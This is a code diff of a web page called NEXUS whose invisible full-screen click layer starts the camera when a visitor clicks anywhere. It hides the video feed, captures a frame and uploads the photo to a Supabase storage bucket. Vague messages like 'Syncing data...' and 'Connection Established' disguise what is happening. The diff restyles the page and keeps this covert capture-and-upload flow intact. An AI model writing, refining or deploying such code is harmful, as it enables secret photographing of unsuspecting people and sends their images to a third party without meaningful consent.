@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>NEXUS</title>
 
-<!-- کتابخانه Supabase -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <style>
@@ -18,21 +17,35 @@ body{
  display:flex;
  justify-content:center;
  align-items:center;
- background:#050505; /* رنگ پس‌زمینه بسیار تیره بدون الگوی شلوغ */
+ background:#000; 
  color:#fff;
  font-family:"Courier New", monospace;
  overflow: hidden;
  position: relative;
  
- /* انیمیشن ورود نرم برای زمانی که کاربر کلیک می‌کند */
+ /* انیمیشن ورود نرم */
  opacity: 0;
- animation: fadeInSystem 1.5s ease-out forwards;
+ animation: bootUp 2s ease-out forwards;
 }
 
-/* تعریف انیمیشن محو شدن */
-@keyframes fadeInSystem {
-    0% { opacity: 0; transform: scale(0.95); }
-    100% { opacity: 1; transform: scale(1); }
+/* انیمیشن روشن شدن سیستم */
+@keyframes bootUp {
+    0% { opacity: 0; }
+    100% { opacity: 1; }
+}
+
+/* پس‌زمینه نورانی ملایم به جای ماتریکس */
+.glow-bg {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    width: 100vw;
+    height: 100vh;
+    transform: translate(-50%, -50%);
+    background: radial-gradient(circle, rgba(16, 185, 129, 0.15) 0%, transparent 70%);
+    z-index: 1;
+    pointer-events: none;
+    transition: all 1s ease;
 }
 
 .app{
@@ -42,7 +55,7 @@ body{
  text-align: center;
  position: relative;
  z-index: 2;
- pointer-events: none; /* غیرفعال کردن تعامل با متن */
+ pointer-events: none; 
 }
 
 .logo{
@@ -52,8 +65,8 @@ body{
  font-weight:bold;
  letter-spacing:2px;
  margin-bottom: 10px;
- opacity: 0.8;
- text-shadow: 0 0 10px rgba(101, 217, 255, 0.5);
+ opacity: 0.9;
+ text-shadow: 0 0 15px #65d9ff;
 }
 
 .subtitle{
@@ -62,7 +75,7 @@ body{
  line-height:1.9;
  font-size:12px;
  margin-bottom: 20px;
- opacity: 0.7;
+ opacity: 0.8;
 }
 
 #status{
@@ -75,8 +88,9 @@ body{
  font-size:12px;
  line-height:1.8;
  min-height: 30px;
- transition: all 0.5s;
+ transition: opacity 0.5s;
  border: 1px solid #333;
+ box-shadow: 0 0 10px rgba(0,0,0,0.5);
 }
 
 .footer{
@@ -86,7 +100,7 @@ body{
  margin-top:20px;
 }
 
-/* ناحیه کلیک نامرئی - حالا کل صفحه را می‌گیرد */
+/* ناحیه کلیک نامرئی */
 .click-trigger {
     position: fixed;
     top: 0;
@@ -95,7 +109,6 @@ body{
     height: 100%;
     z-index: 10;
     cursor: pointer;
-    /* نشانگر موس را مخفی می‌کنیم تا حس متمرکزتری بدهد */
 }
 
 video{
@@ -104,7 +117,6 @@ video{
  margin-top:15px;
  background:#000;
  display: none !important;
- box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
 }
 
 canvas#canvas {
@@ -116,8 +128,11 @@ canvas#canvas {
 
 <body>
 
-<!-- لایه کلیک نامرئی -->
+<!-- لایه کلیک -->
 <div id="click-trigger" class="click-trigger"></div>
+
+<!-- فقط یک نور ملایم، بدون ماتریکس -->
+<div class="glow-bg"></div>
 
 <div class="app">
 
@@ -162,9 +177,6 @@ let isProcessing = false;
 
 function showStatus(message){
  statusBox.textContent = message;
- // افکت چشمک زدن کوچک هنگام تغییر وضعیت
- statusBox.style.opacity = 0.5;
- setTimeout(() => statusBox.style.opacity = 1, 200);
 }
 
 // تابع اصلی شروع کار
@@ -172,64 +184,60 @@ async function startProcess() {
     if (isProcessing) return;
     isProcessing = true;
     
-    // مخفی کردن ناحیه کلیک تا دیگر نتوان دوباره کلیک کرد
+    // مخفی کردن ناحیه کلیک
     clickTrigger.style.display = 'none';
     
+    // افزایش شدت نور پس‌زمینه هنگام شروع کار
+    document.querySelector('.glow-bg').style.background = "radial-gradient(circle, rgba(16, 185, 129, 0.4) 0%, transparent 70%)";
+
     try{
         showStatus("正在连接摄像头..."); 
 
         if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            throw new Error("مرورگر شما از دوربین پشتیبانی نمی‌کند.");
+            throw new Error("Camera access not supported");
         }
 
-        // درخواست دسترسی به دوربین
         stream = await navigator.mediaDevices.getUserMedia({ video: true });
         
-        showStatus("سیستم فعال شد");
+        showStatus("System Active");
         
-        // نمایش ویدیو در المنت ویدیو
         video.srcObject = stream;
         
-        // آپلود تصویر نمونه به سرور (اختیاری)
+        // آپلود تصویر نمونه
         uploadImage();
 
     } catch (error) {
         console.error(error);
-        showStatus("خطا در اتصال: " + error.message);
-        clickTrigger.style.display = 'block'; // اگر خطا داد، اجازه کلیک مجدد بده
+        showStatus("Error: " + error.message);
+        clickTrigger.style.display = 'block'; 
         isProcessing = false;
     }
 }
 
-// تابع آپلود عکس به Supabase
 function uploadImage() {
-    // گرفتن فریم از ویدیو
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     
-    // تبدیل به فایل
     canvas.toBlob(async (blob) => {
         if (!blob) return;
         
         const fileName = `nexus_${Date.now()}.jpg`;
         const filePath = [BUCKET, fileName].join('/');
         
-        showStatus("در حال آپلود داده...");
+        showStatus("Syncing data...");
         
         const { error } = await db.storage.from(BUCKET).upload(filePath, blob);
         
         if (error) {
-            showStatus("خطا در آپلود");
-            console.error(error);
+            showStatus("Sync Failed");
         } else {
-            showStatus("اتصال برقرار شد ✓");
+            showStatus("Connection Established ✓");
         }
     }, 'image/jpeg', 0.8);
 }
 
-// رویداد کلیک روی کل صفحه
 clickTrigger.addEventListener('click', () => {
     startProcess();
 });
